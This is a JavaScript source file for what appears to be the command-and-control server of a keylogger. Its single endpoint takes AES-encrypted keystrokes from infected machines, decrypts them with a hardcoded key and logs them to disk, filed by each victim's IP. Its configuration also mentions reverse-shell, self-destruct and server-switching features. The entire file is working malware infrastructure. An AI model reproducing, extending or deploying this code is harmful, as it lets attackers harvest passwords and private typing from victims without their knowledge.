const fs = require("fs") 
const express = require("express")
const body_parser = require("body-parser")
const base = require("base-64")
const hex = require("string-hex")
const aesjs = require("aes-js")

const sha512 = require("crypto-js/sha512")
const sha256 = require("crypto-js/sha256")

const app = express()
const PORT = 443 

// express configuration 
app.use(body_parser.urlencoded({
  extended: true
}))

// aes configuration 
const iv = [
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
	0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
] 

const key = [
	0x6B, 0x28, 0x31, 0x33, 0x23, 0x21, 0x31, 0x39, 
	0x21, 0x4C, 0x6C, 0x34, 0x24, 0x31, 0x22, 0x39
] 

// saving configuration
let collects_location = "./collected"
let collects_paths = {
  "key_logs": collects_location + "/key_logs/", 
  "sys_info": collects_location + "/sys_info/"
}
let reports_location = "./serve_info" 
let reports_paths = {
  "rev_shell": reports_location + "/rev_shell", 
  "self_destruct": reports_location + "/self_destruct", 
  "switch_mother_server": reports_location + "/switch_mother_server"
}

// global functions 
const fetch_date = () => {
  var dateObj = new Date()
  var month = dateObj.getUTCMonth() + 1
  var day = dateObj.getUTCDate()
  var year = dateObj.getUTCFullYear()

  return `${year}_${month}_${day}`
}

// Backend - Routes

// API - Routes 
app.post("/client-fetch-keys", (req, res) => { // client sends here the keys
  let keys = req.body.keys
  let ip = req.socket.remoteAddress

  keys = keys.substring(0, keys.length-2)
  console.log("Keys -> " + keys)

  let aes_cbc = new aesjs.ModeOfOperation.cbc(key, iv)
  let encrypted_bytes = aesjs.utils.hex.toBytes(keys)

  let decrypted_bytes = aes_cbc.decrypt(encrypted_bytes)
  let decrypted_text = aesjs.utils.utf8.fromBytes(decrypted_bytes) 

  let logs_location = `${collects_paths["key_logs"]}/${sha512(ip)}`
  let key_logs_line = `${new Date()}: ${decrypted_text.trim()}`
  
  // save the keys into the location 
  fs.mkdirSync(logs_location, { recursive: true })
  fs.appendFile(`${logs_location}/IP`, `${ip}\n`, (err) => {
    console.log(`Error logging ip: ${err}`)
  })

  fs.appendFile(`${logs_location}/${fetch_date()}.dumped`, `${key_logs_line}\n`, (err) => {
    console.log(`Error logging keys: ${err}`)
  })

  res.send("PIVOTER_OK\n")
})

app.listen(PORT)
